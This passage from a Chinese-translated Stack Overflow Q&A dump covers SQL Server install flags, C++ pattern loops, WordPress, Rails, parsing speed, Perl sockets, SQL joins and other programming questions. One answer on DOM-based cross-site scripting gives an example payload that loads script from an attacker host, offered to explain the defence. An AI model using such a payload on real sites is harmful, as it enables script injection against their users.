    System.Diagnostics.Process.Start(curPath, "/QS /ACTION=Install /FEATURES=SQL,TOOLS /IACCEPTSQLSERVERLICENSETERMS=""True"" /INSTANCENAME=""TestDatabase"" SECURITYMODE=SQL" & _
                                         " /SQLSYSADMINACCOUNTS=""BUILTIN\ADMINISTRATORS"" /SAPWD=""********"" /SQLSVCACCOUNT=""NT AUTHORITY\NETWORK SERVICE"" /SQLSVCPASSWORD=""********""" & _
                                         " /AGTSVCACCOUNT=""DomainName\UserName"" /AGTSVCPASSWORD=""*******"" /ASSVCACCOUNT=""DomainName\UserName"" /ASSVCPASSWORD=""********""" & _
                                         " /RSSVCACCOUNT=""DomainName\UserName"" /RSSVCPASSWORD=""*******"" /ISSVCACCOUNT=""NT Authority\Network Service"" /TCPENABLED=""1"" /NPENABLED=""1""") 
```

安装完成并安装安装文件。当它开始安装时，它会停顿一秒钟，然后退出而没有进一步的警告。

我的问题是，我是否可以查看任何类型的错误日志以查看它是否是导致此问题的命令之一？有没有人看到这里缺少的东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:45:57.310

我还会查看 Windows 事件日志，了解它是特定于操作系统的，我会在应用程序下查看。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-02T14:25:14.597

在过去的几个小时里，我一直在尝试这样做，我发现 SQLEXPR.exe 只是一个自解压容器。

执行 SQLEXPR.exe /x 以提取内容。您将在该目录中找到一个 Setup.exe，您可以在其中传递命令行参数。

现在，您可能想知道如何在提示您提取内容的位置编写脚本，我还不能回答。我现在正在尝试这个，因为我需要制作一个完全无人值守的安装程序。我们最终可能只是在服务器内部某处镜像提取目录的压缩副本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:44:31.823

在看

> C:\Program Files\Microsoft SQL Server\110\Setup Bootstrap\Log

在您正在安装的服务器上。

# c++ - C++ 程序，使用嵌套循环设计

> ID：15163741
> 
> 赞同：0
> 
> 时间：2013-03-01T17:43:01.053
> 
> 标签：c++, for-loop, nested, nested-loops

我必须编写一个程序来生成以下输出：

例子：

```
 & & & & & & &
   & & & & &
     & & &    
       & 
```

到目前为止我做了什么：

```
#include<iostream.h>
#include<conio.h>
void main()
{
    clrscr();
    int i,j,k,n;
    cout<<"How many rows?\n";
    cin>>n;
    for(i=n;i>0;i-=2)
    {
        cout<<"\n";

        for(k=(i+1)/2;k>0;--k)
        cout<<" ";

        for(j=1;j<=i;++j)
        cout<<"&";
    }
} 
```

输出是什么：

```
 & & & & &
  & & &
& 
```

请纠正我在哪里犯了错误。任何帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:02:20.697

您的第一次尝试似乎有点复杂。我会做这样的事情：

```
#include <iostream>

int main()
{
    int i,j,k,n;
    std::cout << "How many &'s in the start row?\n";
    std::cin >> n;
    std::cout << std::endl;
    for(i=0; i < n; i+=2)
    {
        for(k=0 ; k < i; k++ )
        {
                std::cout << " ";
        }
        for(j=0; j<(n - i); ++j)
        {
                std::cout<<" &";
        }
        std::cout << std::endl;
    }
    return (0);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-22T10:21:02.777

迟到总比不到好。试试这个简单的解决方案：

```
#include <iostream>
using namespace std;

int main()
{
  char ch = '&';
  for(int i = 1; i <= 4; i++)
  {
    for(int j = 1; j <= 3; j++)
    {
        if( i > j)
            cout << " ";
        else
            cout << ch;   
    }

    cout << ch;

    for(int j = 3; j >= 1; j--)
    {
        if( i > j)
            cout << " ";
        else
            cout << ch;   
    }

    cout << "\n";
  }

  return 0;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-27T06:35:08.527

```
import java.util.*;
import java.lang.*;
import java.io.*;
class Design{
     public static void main(String args[])
    {
        Scanner sc=new Scanner(System.in);
        for(int i=0;i<4;i++)
        {
            for(int k=0;k<i;k++)
            {
                System.out.print(" ");
            }
            for(int j=i;j<7-i;j++)
            {
                System.out.print("&");
            }
            System.out.println();

        }
    }

} 
```

# wordpress - 在 wordpress 中创建具有 1 个类别的循环的多个页面

> ID：15163746
> 
> 赞同：0
> 
> 时间：2013-03-01T17:43:24.013
> 
> 标签：wordpress, loops, post, categories

我需要为单个类别制作一个循环。一切正常，除了我无法将页面拆分为多个部分。

这是我页面的循环。输出很好，除了导航栏不显示，只需将 /page/2 添加到 url 即可显示前 2 个帖子。

```
 <?php query_posts('cat=179&posts_per_page=2'); ?>

            <?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>

            <div id="post-<?php the_ID(); ?>" <?php post_class(); ?>>

            <h2 class="entry-title"><a href="<?php the_permalink(); ?>" title="<?php printf( esc_attr__( 'Permalink to %s', 'morlottiTabs' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php the_title(); ?></a></h2>

            <div class="entry-meta">
                <?php morlottiTabs_posted_on(); ?>
            </div>

            <div class="entry-content">
                <?php the_content(); ?>
            </div><!-- .entry-content -->

                <div class="entry-utility">
                    <?php morlottiTabs_posted_in(); ?>
                    <?php edit_post_link( __( 'Edit', 'morlottiTabs' ), '<span class="edit-link">', '</span>' ); ?>
                </div><!-- .entry-utility -->
              </div>
            <?php endwhile; endif; ?>

            <?php /* Display navigation to next/previous pages when applicable */ ?>
            <?php if (  $wp_query->max_num_pages > 1 ) : ?>
                            <div id="nav-below" class="navigation">
                                <div class="nav-previous"><?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'morlottiTabs' ) ); ?></div>
                                <div class="nav-next"><?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'morlottiTabs' ) ); ?></div>
                            </div><!-- #nav-below -->

            <?php endif; ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T20:05:26.123

你可以尝试这样做。还列出了一些其他的分页方法。

参考：[http ://digwp.com/2009/08/wordpress-page-navigation/](http://digwp.com/2009/08/wordpress-page-navigation/)

参考：[http ://codex.wordpress.org/Class_Reference/WP_Query](http://codex.wordpress.org/Class_Reference/WP_Query)

* * *

**编辑：**

你想尝试不同的方法吗？

Wordpress 有自己的分页方法

参考：[http ://codex.wordpress.org/Function_Reference/paginate_links](http://codex.wordpress.org/Function_Reference/paginate_links)

```
<?php echo paginate_links( $args ) ?> 
```

# ruby - 在 Ruby on Rails 中将 rake 任务和测试文件的辅助函数放在哪里？

> ID：15163750
> 
> 赞同：12
> 
> 时间：2013-03-01T17:43:55.577
> 
> 标签：ruby, ruby-on-rails-3, ruby-on-rails-3.1, ruby-on-rails-3.2, rake-task

在我的 Rails 应用程序中，我的目录中有一个文件`sample_data.rb`以及`/lib/tasks`一堆测试文件`/spec`。

所有这些文件通常具有共同的功能，例如：

```
def random_address
  [Faker::Address.street_address, Faker::Address.city].join("\n")
end 
```

我应该把这些辅助函数放在哪里？对此有某种约定吗？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-01T21:43:42.013

您可以使用静态函数创建一个静态类。看起来像这样：

```
class HelperFunctions

     def self.random_address
          [Faker::Address.street_address, Faker::Address.city].join("\n")
     end

     def self.otherFunction
     end
end 
```

然后，您需要做的就是：

1.  在您要使用的文件中包含您的助手类
2.  像这样执行它：

    ```
    HelperFunctions::random_address(anyParametersYouMightHave) 
    ```

执行此操作时，请确保在`HelperFunctions`类中包含任何依赖项。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-05-28T14:23:24.387

如果您确定它只是特定于 rake，您也可以直接添加`RAILS_ROOT/Rakefile`（您使用的示例可能不是这种情况）。

我用它来简化 rake 的调用语法：

```
#!/usr/bin/env rake
# Add your own tasks in files placed in lib/tasks ending in .rake,
# for example lib/tasks/capistrano.rake, and they will automatically be available to Rake.

require File.expand_path('../config/application', __FILE__)

def invoke( task_name )
  Rake::Task[ task_name ].invoke
end

MyApp::Application.load_tasks 
```

这样，我可以`invoke "my_namespace:my_task"`在 rake 任务中使用而不是`Rake::Task[ "my_namespace:my_task" ].invoke`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-25T10:13:28.000

您在模块中共享方法，并将这样的模块放置在`lib`文件夹中。

像`lib/fake_data.rb`包含的东西

```
module FakeData
  def random_address
    [Faker::Address.street_address, Faker::Address.city].join("\n")
  end

  module_function 
end 
```

在你的 rake 任务中只需要模块，然后调用`FakeData.random_address`.

但是，如果它就像你每次运行测试时都需要做的种子，你应该考虑将它添加到你的 general `before all`.

例如我的`spec_helper`样子是这样的：

```
# Requires supporting ruby files with custom matchers and macros, etc,
# in spec/support/ and its subdirectories.
Dir[Rails.root.join("spec/support/**/*.rb")].each { |f| require f }

RSpec.configure do |config|
  config.use_transactional_fixtures = true
  config.infer_base_class_for_anonymous_controllers = false
  config.order = "random"

  include SetupSupport

  config.before(:all) do
    load_db_seed
  end
end 
```

模块`SetupSupport`定义`spec/support/setup_support.rb`如下：

```
module SetupSupport

  def load_db_seed
    load(File.join(Rails.root, 'db', 'seeds.rb'))
  end

end 
```

不确定您是否需要加载种子，或者已经在这样做，但这是生成所需假数据的理想场所。

请注意，我的设置支持类已定义，`spec/support`因为代码仅与我的规范相关，我没有 rake 任务也需要相同的代码。

# c++ - 加快从 C++ 文件中读取整数的速度

> ID：15163751
> 
> 赞同：1
> 
> 时间：2013-03-01T17:43:56.407
> 
> 标签：c++, performance, parsing, fstream

我正在逐行读取文件，并从中提取整数。一些值得注意的点：

*   输入文件不是二进制文件；
*   我无法将整个文件加载到内存中；
*   文件格式（仅整数，由一些分隔符分隔）：

    ```
    x1 x2 x3 x4 ...
    y1 y2 y3 ...
    z1 z2 z3 z4 z5 ...
    ... 
    ```

*只是为了添加 context*，我正在读取整数，并使用`std::unordered_map<unsigned int, unsinged int>`.

简单地遍历行，并分配无用的字符串流，如下所示：

```
std::fstream infile(<inpath>, std::ios::in);
while (std::getline(infile, line)) {
    std::stringstream ss(line);
} 
```

一个 700MB 的文件给我大约 2.7 秒。

解析每一行：

```
unsigned int item;
std::fstream infile(<inpath>, std::ios::in);
while (std::getline(infile, line)) {
    std::stringstream ss(line);
    while (ss >> item);
} 
```

给我约 17.8 秒的同一个文件。

如果我将运算符更改为`std::getline`+ `atoi`：

```
unsigned int item;
std::fstream infile(<inpath>, std::ios::in);
while (std::getline(infile, line)) {
    std::stringstream ss(line);
    while (std::getline(ss, token, ' ')) item = atoi(token.c_str());
} 
```

它给出了~14.6s。

有什么比这些方法更快的吗？我认为没有必要加快文件读取速度，只是解析本身 - 两者都不会造成任何伤害，但（：

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T18:23:01.347

这个节目

```
#include <iostream>
int main ()
{
    int num;
    while (std::cin >> num) ;
} 
```

读取文件大约需要 17 秒。这段代码

```
#include <iostream>   
int main()
{
    int lc = 0;
    int item = 0;
    char buf[2048];
    do
    {
        std::cin.read(buf, sizeof(buf));
        int k = std::cin.gcount();
        for (int i = 0; i < k; ++i)
        {
            switch (buf[i])
            {
                case '\r':
                    break;
                case '\n':
                    item = 0; lc++;
                    break;
                case ' ':
                    item = 0;
                    break;
                case '0': case '1': case '2': case '3':
                case '4': case '5': case '6': case '7':
                case '8': case '9':
                    item = 10*item + buf[i] - '0';
                    break;
                default:
                    std::cerr << "Bad format\n";
            }    
        }
    } while (std::cin);
} 
```

同一个文件需要 1.25 秒。做你想做的...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T17:49:29.023

流很慢。如果你真的想快速将整个文件加载到内存中，并在内存中解析它。如果实在无法将其全部加载到内存中，则分块加载，使这些块尽可能大，然后解析内存中的块。

在内存中解析时，将空格和行尾替换为空值，以便您可以`atoi`随时转换为整数。

哦，你会遇到块结束的问题，因为你不知道块结束是否会切断一个数字。为了解决这个问题，在块结束之前轻松停止一小段距离（应该做 16 个字节），并将这个尾部复制到开头，然后再加载它之后的下一个块。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T17:53:56.953

您是否尝试过输入迭代器？

它跳过了字符串的创建：

```
std::istream_iterator<int> begin(infile);
std::istream_iterator<int> end;
int item = 0;
while(begin != end)
    item = *begin++; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T18:05:34.017

为什么不跳过流和行缓冲区并直接从文件流中读取？

```
template<class T, class CharT, class CharTraits>
std::vector<T> read(std::basic_istream<CharT, CharTraits> &in) {
    std::vector<T> ret;
    while(in.good()) {
        T x;
        in >> x;
        if(in.good()) ret.push_back(x);
    }
    return ret;
} 
```

[http://ideone.com/FNJKFa](http://ideone.com/FNJKFa)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-01T18:14:13.870

跟进 Jack Aidley 的回答（不能在评论中添加代码），这里有一些伪代码：

```
vector<char> buff( chunk_size );
roffset = 0;
char* chunk = &buff[0];
while( not done with file )
{
    fread( chunk + roffset, ... ); // Read a sizable chunk into memory, filling in after roffset
    roffset = find_last_eol(chunk); // find where the last full line ends
    parse_in_mem( chunk, chunk_size - roffset ); // process up to the last full line
    move_unprocessed_to_front( chunk, roffset ); // don't re-read what's already in mem
} 
```

# javascript - 安全扫描显示 JS 脚本文件中的漏洞

> ID：15163761
> 
> 赞同：1
> 
> 时间：2013-03-01T17:44:21.483
> 
> 标签：javascript, security, cross-site

我最近在我的站点上运行了安全扫描，其中一个正在使用的 JS 文件被标记为存在 DOM 跨站点脚本问题，我不确定如何修复它。

文件：jquery.address1.4.js

这是被标记的代码部分的脚本：

```
_supported = 
            (_mozilla && _version >= 1) || 
            (_msie && _version >= 6) ||
            (_opera && _version >= 9.5) ||
            (_webkit && _version >= 523);

        if (_supported) {
            if (_opera) {
                history.navigationMode = 'compatible';
            }
            if (document.readyState == 'complete') {
                var interval = setInterval(function() {
                    if ($.address) {
                        _load();
                        clearInterval(interval);
                    }
                }, 50);
            } else {
                _options();
                $(_load);
            }
            $(window).bind('popstate', _popstate).bind('unload', _unload);            
        } else if (!_supported && _hrefHash() !== '') {
            _l.replace(_l.href.substr(0, _l.href.indexOf('#')));
        } else {
            _track();
        } 
```

代码行是这样的：

```
_l.replace(_l.href.substr(0, _l.href.indexOf('#'))); 
```

扫描告诉我要清理输入，但我不确定它指的是什么，因为我们在网站上没有“输入”。如何修复上述代码以便通过安全扫描？

编辑：这是 _l 的值

```
_l = _t.location, 
```

从：

```
_window = function() {
                try {
                    return top.document !== UNDEFINED ? top : window;
                } catch (e) { 
                    return window;
                }
            },

ID = 'jQueryAddress',
            STRING = 'string',
            HASH_CHANGE = 'hashchange',
            INIT = 'init',
            CHANGE = 'change',
            INTERNAL_CHANGE = 'internalChange',
            EXTERNAL_CHANGE = 'externalChange',
            TRUE = true,
            FALSE = false,
            _opts = {
                autoUpdate: TRUE, 
                crawlable: FALSE,
                history: TRUE, 
                strict: TRUE,
                wrap: FALSE
            },
            _browser = $.browser, 
            _version = parseFloat($.browser.version),
            _mozilla = _browser.mozilla,
            _msie = _browser.msie,
            _opera = _browser.opera,
            _webkit = _browser.webkit || _browser.safari,
            _supported = FALSE,
            _t = _window(),
            _d = _t.document,
            _h = _t.history, 
            _l = _t.location,
            _si = setInterval,
            _st = setTimeout,
            _re = /\/{2,9}/g,
            _agent = navigator.userAgent,            
            _frame,
            _form,
            _url = _search(document),
            _qi = _url ? _url.indexOf('?') : -1,
            _title = _d.title, 
            _silent = FALSE,
            _loaded = FALSE,
            _justset = TRUE,
            _juststart = TRUE,
            _updating = FALSE,
            _listeners = {}, 
            _value = _href(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T23:46:36.610

此示例中未经处理的值将是从您的 URL 检索到的哈希值。URL 中任何前面的“#”值都应进行清理，以确保攻击者无法在该上下文中提供他们自己的 javascript。

仅仅因为这个值可能不是一个明确的用户提供的“输入”，没有什么可以阻止恶意用户提供如下恶意值：

```
#"><script src=http://badguy.com/xss.js /> 
```

这将在其他用户的上下文中执行。

此示例的有效防御或输入清理将是白名单方法。仅接受 # 的已知值，不允许攻击者可能提供的任何内容。

这是防御基于 DOM 的 XSS 的绝佳资源[https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)我建议您通读一遍。

# python - 字典中FIFO顺序的pythonic方式

> ID：15163762
> 
> 赞同：3
> 
> 时间：2013-03-01T17:44:25.033
> 
> 标签：python, dictionary

我正在尝试在 python 中填充字典，但我想在键进入时保留它们的顺序 - 就像列表一样，FIFO 可以做到这一点。

例如，

我阅读了一个名为 animals.txt 的文件，其中包含以下信息：

```
animal\tconservation_status\n
dog\tdomesticated\n
tiger\tEN\n
panda\tEN\n 
```

IE，

```
animals = {'dog':'dom','tiger':'EN', 'panda':'EN'}
>>> for el in animals:
...     print el
... 
tiger
dog
panda 
```

在FIFO中应该有狗，老虎，熊猫出来......

当我将其读入字典时，将不会保留该顺序。我希望保留订单，这样当我执行 for 循环时，FIRST IN 就是 FIRST OUT。

即，狗，然后是老虎，然后是熊猫。

有没有一种很好的方法可以做到这一点而不必保留外部索引或更复杂的字典结构？不确定，对不起我在这里的天真...

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-01T17:45:08.713

是的。您使用[collections.OrderedDict](http://docs.python.org/2/library/collections.html#collections.OrderedDict)而不是常规字典。

```
>>> d = OrderedDict((x,x) for x in reversed(range(10)) )
>>> d
OrderedDict([(9, 9), (8, 8), (7, 7), (6, 6), (5, 5), (4, 4), (3, 3), (2, 2), (1, 1), (0, 0)])
>>> regular = dict((x,x) for x in reversed(range(10)))
>>> regular
{0: 0, 1: 1, 2: 2, 3: 3, 4: 4, 5: 5, 6: 6, 7: 7, 8: 8, 9: 9} 
```

请注意，`OrderedDict`保留顺序，而常规`dict`不保留。

* * *

```
>>> OrderedDict([('dog','dom'),('tiger','EN'), ('panda','EN')])
OrderedDict([('dog', 'dom'), ('tiger', 'EN'), ('panda', 'EN')]) 
```

另一个问题是您需要以`.update`保持顺序的方式将项目传递给构造函数（或）。换句话说，您不能将关键字 args 传递给构造函数并期望保留顺序：

```
>>> OrderedDict(dog='dom',tiger='EN',panda='EN')  #doesn't preserve order
OrderedDict([('tiger', 'EN'), ('panda', 'EN'), ('dog', 'dom')]) 
```

# database - 我可以在我的 wordpress 网站中使用 Contact Form DB 插件来保存和显示数据而不发送电子邮件吗

> ID：15163766
> 
> 赞同：1
> 
> 时间：2013-03-01T17:44:37.007
> 
> 标签：database, wordpress, customization, contact-form-7

我想创建一个 wordpress 自定义插件来保存三个数据字段，以及 wp-admin 区域中每个项目的相同图像。它应该能够在一个页面中显示所有这些项目。当我搜索插件时，我发现了 Contact Form DB 插件，它可以用作联系人表单 7 插件扩展，用于保存通过它发送的数据.. [http://wordpress.org/extend/plugins/contact-form-7-to-数据库扩展/](http://wordpress.org/extend/plugins/contact-form-7-to-database-extension/)

我可以在我的 wordpress 网站中使用 Contact Form DB 插件来保存和显示数据而不发送电子邮件吗？它也发送电子邮件，但我只想存储和显示数据。

另一个问题：- 我已经在使用联系表格 7 插件中的联系表格来发送电子邮件查询。在联系表格 7 中保存数据的更改会影响其工作吗？

请帮助我提供任何参考或解决方案，因为我是 wordpress 新手，目前不了解插件开发。任何帮助将不胜感激..提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-11-27T18:16:58.790

您可以使用`wpcf7_before_send_mail`操作挂钩来防止将表单发送到电子邮件。（我已经使用“联系表单数据库”插件对此进行了测试——它会在过滤电子邮件之前保存数据）

要仅过滤特定的表单 ID - 使用如下内容：

```
function wpcf7_skip_email_sending($wpcf7_data)
{
    if ( in_array($wpcf7_data->id(), array(2,3,7)) ) {
        $wpcf7_data->skip_mail = true;
    }
}
add_action("wpcf7_before_send_mail", "wpcf7_skip_email_sending"); 
```

（对于较旧的 CF7 版本，您可能需要更改`$wpcf7_data->id()`为`$wpcf7_data->id`）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T19:42:21.310

如果您设置联系表格 7 并输入垃圾邮件或 noreply 电子邮件地址以将消息发送到联系表格 7，它仍会在联系表格 DB 中记录正在发送的消息

因此，在短代码模板中，将消息发送到 junk@yourdomain.com，每当用户提交时，它都会尝试发送到该电子邮件，并且仍会将电子邮件记录为已发送。就我个人而言，我实际上会创建该电子邮件地址，这样您的 smtp 就不会被 smtp 服务器的反弹淹没。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-03-12T14:57:02.070

为了避免发送电子邮件，甚至不接触文件，最快的方法是在[附加设置](https://contactform7.com/additional-settings/)选项卡中添加

```
demo_mode: on 
```

或者

```
skip_mail: on 
```

使用 Contact Form DB 都可以正常工作。不同之处在于它`demo_mode`不适用于 Flamingo。

# checkbox - C#中组合框内的复选框

> ID：15163768
> 
> 赞同：0
> 
> 时间：2013-03-01T17:44:45.040
> 
> 标签：checkbox, combobox

我有一个叫做爱好的领域..用户可能有多种爱好。我想做一个爱好组合框，但有多种选择……所以我可以选择更多的一个选项。

我想用 checkbox 制作组合框。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:46:23.023

使用winforms提供的checkedListbox控件。

# perl - perl tcp 客户端不显示传入数据

> ID：15163778
> 
> 赞同：1
> 
> 时间：2013-03-01T17:45:28.873
> 
> 标签：perl, sockets, tcp

我对网络编程完全陌生，无法解决这个问题

我有一个服务器（某种 LPT 端口到 TCP/IP 代理），它会自动尝试以随机间隔建立连接。我需要监听特定端口并与服务器通信。那是客户。它适用于 perl tcp 服务器.. 但在这种情况下它会等待.... 没有任何反应

```
#!/usr/bin/perl -w
use IO::Socket;
my $sock = new IO::Socket::INET(
    LocalHost => '192.168.1.1',
    LocalPort => '7000',
    Proto     => 'tcp',
    Listen    => 1,
    Reuse     => 1,
);
die "Could not create socket: $!\n" unless $sock;
my $new_sock = $sock->accept();
while (<$new_sock>) {
    print $_;
}
close($sock); 
```

它适用于我的简单 tcp 服务器，但使用这个“黑盒” - 不，在客户端机器上有两个连接：

```
tcp        0      0 192.168.1.1:7000      0.0.0.0:*               LISTEN     
tcp        0      0 192.168.1.1:7000      192.168.1.2:33822     ESTABLISHED 
```

但如果我尝试

```
nc -l 192.168.1.1 7000 
```

它就像一个魅力，数据在流动。并且只有一个连接存在（如第二个）

在客户端捕获的一个符号传输的 tcpdump 片段。似乎还可以

```
21:42:00.242172 IP (tos 0x0, ttl 64, id 30448, offset 0, flags [DF], proto TCP (6), length 53)
192.168.1.2.33837 > 192.168.1.1.7000: Flags [P.], cksum 0x5646 (correct), seq 3592562130:3592562131, ack 1351632513, win 92, options [nop,nop,TS val 140364552 ecr 92554083], length 1 
```

我不知道我做错了什么......更复杂的例子对我不起作用，因为我不知道如何调试它们......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T19:54:17.490

`<$new_sock>`, 的缩写`readline($new_sock)`, 仅在收到完整行后才返回，即收到换行符时。

`sysread`一旦数据可用，将立即返回，因此您可以使用它。

```
my $rv = sysread($new_sock, my $buf, 64*1024); 
```

或者，由于您收到的行以回车结束，您可以将其传达给 Perl。

```
$/ = "\r"; 
```

# mysql - MYSQL 在'left join'语句中的'on'和'where'之后使用'is null'

> ID：15163781
> 
> 赞同：0
> 
> 时间：2013-03-01T17:45:39.827
> 
> 标签：mysql, sql, null, left-join

我想过滤用户表中每个性别的最高人，这是可以正常工作的代码：

```
SELECT s1.name, s1.sex, s1.height 
FROM user s1 
LEFT JOIN user s2 ON s1.sex =s2.sex AND s1.height < s2.height 
WHERE s2.name IS NULL; 
```

但这一个不起作用：

```
SELECT s1.name, s1.sex, s1.height 
FROM user s1 
LEFT JOIN user s2 ON s1.sex =s2.sex AND s1.height < s2.height AND s2.name IS NULL; 
```

这是否意味着“is null”只能在“where”子句之后使用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:48:30.617

第一个版本排除了表中没有匹配行的记录`user`——这些记录在您加入时会有一个`null`值。

第二个版本是过滤`name`列中值为 的记录`null`。

*   [连接的视觉解释](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T17:49:04.877

不。

看看您的第二个查询，`s2.name`还没有，`NULL`因为您仍在加入行。因此，列的结果值可以在连接时`null`或`null not`连接后进行评估，并且可以在`where`子句上进行过滤。

# php - WordPress 不使用我的 attachment.php 模板

> ID：15163783
> 
> 赞同：0
> 
> 时间：2013-03-01T17:45:50.737
> 
> 标签：php, wordpress, wordpress-theming

我有一个非常奇怪的问题，导致 WordPress 网站使用旧模板显示附件/图像。我的附件.php 曾经是二十二附件模板的重新样式版本，但我对其进行了修改并将其投入生产。但无论我们做什么，都使用旧模板。相比：

开发：http : [//dev.metlifeyourlife.com/home-care/landscaping-to-keep-you-safe/attachment/father-and-daughter-8-9-years-preparing-to-plant-tree-in-房子前方/](http://dev.metlifeyourlife.com/home-care/landscaping-to-keep-you-safe/attachment/father-and-daughter-8-9-years-preparing-to-plant-tree-in-front-of-house/)

产品：[http ://www.metlifeyourlife.com/home-care/landscaping-to-keep-you-safe/attachment/father-and-daughter-8-9-years-preparing-to-plant-tree-in-房子前方/](http://www.metlifeyourlife.com/home-care/landscaping-to-keep-you-safe/attachment/father-and-daughter-8-9-years-preparing-to-plant-tree-in-front-of-house/)

IT 坚持 dev 和 prod 上的代码是相同的，并且 attachment.php 在 wp-admin 编辑器（外观 > 编辑器）中看起来确实正确。我开始考虑缓存问题，但这几个月来一直如此。

问题是：什么会导致这种情况，我怎样才能让 prod 与 dev 相匹配？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T17:33:58.823

有证据表明旧的附件文件仍然存在于某处的生产环境中，但我想分享我的解决方案，最终揭示了这一点。

attachment.php 是 WordPress 通常用于构建附件页面的文件，但它会被基于 MIME 类型命名的文件覆盖。我将我的附件.php 重命名为 image.php（因为我们所有的附件都是图像），这确实得到了立即应用。

# xml - 为配置定义的值设置默认值？

> ID：15163788
> 
> 赞同：0
> 
> 时间：2013-03-01T17:46:03.940
> 
> 标签：xml, magento

如何将默认值分配给我在 system.xml 文件中定义的配置值？目前它默认为“否”，但我希望它默认为“是”。

这是我当前的定义代码：

```
<catalog>
            <groups>
                <my_val>
                    <label>My Label</label>
                    <frontend_type>text</frontend_type>
                    <sort_order>160</sort_order>
                    <show_in_default>1</show_in_default>
                    <show_in_website>1</show_in_website>
                    <show_in_store>1</show_in_store>
                    <fields>
                        <my_inner_val translate='label comment'>
                            <label>Enable seperate cart items</label>
                            <frontend_type>select</frontend_type>
                            <source_model>adminhtml/system_config_source_yesno</source_model>
                            <sort_order>1</sort_order>
                            <show_in_default>1</show_in_default>
                            <show_in_website>1</show_in_website>
                            <show_in_store>1</show_in_store>
                        </my_inner_val>
                    </fields>
                </my_val>
            </groups>
        </catalog> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:39:52.397

在您的 config.php 中，您可以使用

```
<default>
    <catalog>
        <my_val>
            <my_inner_val>###</my_inner_val>
        </... 
```

我不完全确定您需要为### 设置的值，但是 1 或 yes 应该可以工作。

# c# - 是否可以从不同解决方案中的单独项目访问 App_Data

> ID：15163790
> 
> 赞同：0
> 
> 时间：2013-03-01T17:46:19.347
> 
> 标签：c#, iis

您将如何从在同一 iis 服务器上运行的 Web 服务（项目 Foo2）访问 App_Data/data.json（在项目 Foo 中）。Foo & Foo2 位于具有相同父文件夹的单独文件夹中？

在 Foo 项目中，我使用了这样的东西：

```
string path = System.IO.Path.GetFullPath(Server.MapPath("~/App_Data/data.json")); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:53:59.897

如果两个项目都是 IIS 中的单独 Web 应用程序，则您无法访问它。我认为每个 application/pool/virtual 目录都限制在自己的树中（有例外，尽管我避免使用它们）。但是，如果它是同一个 Web 项目解决方案中的两个项目，例如在同一个虚拟目录（链接到父文件夹）下，那么您的方法应该可以正常工作；除了你应该使用类似 FileInfo/DirectoryInfo/File 类的东西。

# postgresql - 如何仅从 PostgreSQL 中的 varchar 列中选择整数值

> ID：15163793
> 
> 赞同：10
> 
> 时间：2013-03-01T17:46:24.283
> 
> 标签：postgresql, numeric, varchar

如何仅从 PostgreSQL 中的 varchar 列中选择整数值？

如果该列包含：

```
abc
70
3g
71
1.5 
```

我只想选择：

```
70
71 
```

我正在努力寻找类似的函数：is_numeric，is_integer，来做这样的事情：

```
SELECT column
FROM table
WHERE isinteger(column) 
```

有任何想法吗？谢谢你。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T17:57:50.213

```
SELECT column
FROM table
WHERE column ~ '^\d+$' 
```

# c - 为windows绑定C语言

> ID：15163800
> 
> 赞同：-1
> 
> 时间：2013-03-01T17:46:59.633
> 
> 标签：c, sockets, bind

我无法在 Windows（C 语言）上使用绑定方法。出色地。我的代码应该做以下事情：

1.  从用户那里获取 2 个地址：一个必须是本地计算机的 IP 地址，另一个必须是远程地址（例如 google 地址）。
2.  我正在编写的应用程序将绑定到本地地址
3.  应用程序将连接到第二个地址。

我从网上得到了一些代码。您可以查看我在评论中咨询过的所有来源。

```
This application will only accepts a string from the client (which specifies the local
address which the application will bind), then, the app will connect to a remote service
google, youtube or whatever. The main purpose that this app serves is to know if, when
 binded to a local address, the operative system (in this case Windows Based system) gives priority to:
- SA/DA rule
- Forwarding table

SOURCES:

http://stackoverflow.com/questions/2065495/using-a-specific-network-interface-for-a-socket-in-windows
http://stackoverflow.com/questions/2605182/when-binding-a-client-tcp-socket-to-a-specific-local-port-with-winsock-so-reuse
http://www.delta-search.com/?q=error+on+binding+to+local+address%2Cwindows&s=web&as=0&rlz=0&babsrc=HP_ss
